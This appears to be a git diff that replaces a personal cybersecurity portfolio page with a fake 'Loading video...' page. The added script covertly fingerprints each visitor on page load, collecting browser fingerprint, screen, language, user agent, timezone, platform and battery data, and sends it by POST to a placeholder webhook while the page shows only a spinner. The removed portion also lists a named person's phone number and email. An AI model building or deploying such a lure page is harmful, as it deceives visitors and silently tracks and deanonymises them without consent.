@@ -1,264 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seyed Hojat Hosseini - Cybersecurity Specialist</title>
-    <style>
-        /* General Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            color: #fff;
-            background-color: #181818;
-            line-height: 1.6;
-        }
-
-        a {
-            color: #00ff00;
-            text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-        /* Header Section */
-        header {
-            background-color: #000000;
-            padding: 40px 0;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0, 255, 0, 0.2);
-        }
-
-        header h1 {
-            font-size: 3.5rem;
-            color: #00ff00;
-            margin-bottom: 10px;
-        }
-
-        header p {
-            font-size: 1.2rem;
-            font-weight: 300;
-            color: #bbb;
-        }
-
-        /* Navigation Bar */
-        nav {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        nav ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        nav ul li {
-            display: inline-block;
-            margin: 0 15px;
-            font-size: 1.1rem;
-        }
-
-        /* Showcase Section */
-        .showcase {
-            background: url('https://raw.githubusercontent.com/seyedhojjathosseini/seyedhojjathosseini.github.io/refs/heads/main/high-tech-background.jpg') no-repeat center center/cover;
-            padding: 100px 20px;
-            text-align: center;
-            color: #fff;
-            background-size: cover;
-            position: relative;
-            z-index: 1;
-        }
-
-        .showcase h1 {
-            font-size: 4rem;
-            margin-bottom: 10px;
-        }
-
-        .showcase p {
-            font-size: 1.6rem;
-            margin-top: 10px;
-        }
-
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: -1;
-        }
-
-        /* Section Styles */
-        section {
-            padding: 60px 20px;
-            margin-top: 40px;
-        }
-
-        section h2 {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            color: #00ff00;
-        }
-
-        .bio {
-            background-color: #212121;
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 6px 20px rgba(0, 255, 0, 0.15);
-            margin-bottom: 40px;
-        }
-
-        .bio p {
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-        }
-
-        /* Skills Section */
-        .skills-list {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            gap: 15px;
-        }
-
-        .skills-list li {
-            background-color: #00ff00;
-            color: #181818;
-            padding: 15px;
-            width: 48%;
-            text-align: center;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            box-shadow: 0 6px 20px rgba(0, 255, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-
-        .skills-list li:hover {
-            transform: scale(1.05);
-        }
-
-        /* Footer Section */
-        footer {
-            background-color: #121212;
-            color: #bbb;
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        footer p {
-            font-size: 1rem;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            header h1 {
-                font-size: 2.8rem;
-            }
-
-            .showcase h1 {
-                font-size: 3rem;
-            }
-
-            section h2 {
-                font-size: 2rem;
-            }
-
-            .skills-list li {
-                width: 100%;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading video...</title>
+  <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      text-align: center;
+      padding-top: 50px;
+      font-family: sans-serif;
+    }
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
+  <div class="loader"></div>
+  <h2>Loading video...</h2>
 
-    <header>
-        <h1>Seyed Hojat Hosseini</h1>
-        <p>Cybersecurity Specialist | SOC & SOAR Engineer | Penetration Tester</p>
-        <nav>
-            <ul>
-                <li><a href="#contact">Contact</a></li>
-                <li><a href="#education">Education</a></li>
-                <li><a href="#experience">Experience</a></li>
-                <li><a href="#skills">Skills</a></li>
-            </ul>
-        </nav>
-    </header>
+  <script>
+    (async () => {
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
 
-    <div class="showcase">
-        <div class="overlay"></div>
-        <h1>Innovating Cybersecurity Solutions</h1>
-        <p>Defending the digital world with cutting-edge tools and expertise.</p>
-    </div>
+      const extraInfo = {
+        screen: window.screen.width + "x" + window.screen.height,
+        language: navigator.language,
+        userAgent: navigator.userAgent,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform: navigator.platform,
+        battery: await navigator.getBattery().then(b => ({
+          charging: b.charging,
+          level: b.level
+        })).catch(() => "Battery API blocked"),
+      };
 
-    <section id="contact">
-        <div class="bio">
-            <h2>Contact Information</h2>
-            <p><strong>Phone:</strong> +98 933 877 6977</p>
-            <p><strong>Email:</strong> <a href="mailto:SeyedHojjatHosseini@gmail.com">SeyedHojjatHosseini@gmail.com</a></p>
-            <p><strong>LinkedIn:</strong> <a href="https://linkedin.com/in/seyedhojjathosseini" target="_blank">linkedin.com/in/seyedhojjathosseini</a></p>
-            <p><strong>GitHub:</strong> <a href="https://github.com/seyedhojjathosseini" target="_blank">github.com/seyedhojjathosseini</a></p>
-            <p><strong>Location:</strong> Tehran, Iran</p>
-        </div>
-    </section>
-
-    <section id="education">
-        <div class="bio">
-            <h2>Education</h2>
-            <p><strong>Bachelor of Computer Software Engineering</strong></p>
-            <p>Miaad University, Iran (September 2018 - June 2020)</p>
-            <h2>Certifications & Training</h2>
-            <ul>
-                <li>Penetration Tester Certification</li>
-                <li>Ethical Hacker Certification</li>
-                <li>CompTIA CySA+</li>
-                <li>HackTheBox Academy Courses</li>
-            </ul>
-        </div>
-    </section>
-
-    <section id="experience">
-        <div class="bio">
-            <h2>Experience</h2>
-            <h3>Informatics Services Corporation</h3>
-            <p><strong>Cybersecurity Specialist | SOC & SOAR Engineer | Penetration Tester</strong> (November 2021 - Present)</p>
-            <ul>
-                <li>Developed custom SOAR solutions for streamlined security automation.</li>
-                <li>Led incident response teams and managed over 200 security events.</li>
-                <li>Created frameworks to automate penetration testing tasks.</li>
-            </ul>
-
-            <h3>Future Wave Ultratech Company</h3>
-            <p><strong>Cybersecurity Expert | Penetration Testing Specialist</strong> (August 2017 - November 2021)</p>
-            <ul>
-                <li>Led penetration tests for banking systems and mobile applications.</li>
-                <li>Created vulnerability analysis tools and frameworks.</li>
-            </ul>
-        </div>
-    </section>
-
-    <section id="skills">
-        <h2>Skills</h2>
-        <ul class="skills-list">
-            <li>Security Operations: SOC, Threat Hunting, Incident Response</li>
-            <li>Application Security: Web, API, Mobile App Security</li>
-            <li>Automation & Scripting: Python, Bash, PowerShell</li>
-            <li>Security Tools: Metasploit, Burp Suite, Nessus, Wireshark</li>
-            <li>Machine Learning for Security: Automation & AI Integration</li>
-            <li>Project Management: Agile, Leadership, Collaboration</li>
-        </ul>
-    </section>
-
-    <footer>
-        <p>&copy; 2024 Seyed Hojat Hosseini. All rights reserved.</p>
-    </footer>
-
+      fetch("https://your-webhook-url.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ...result, ...extraInfo })
+      });
+    })();
+  </script>
 </body>
 </html>
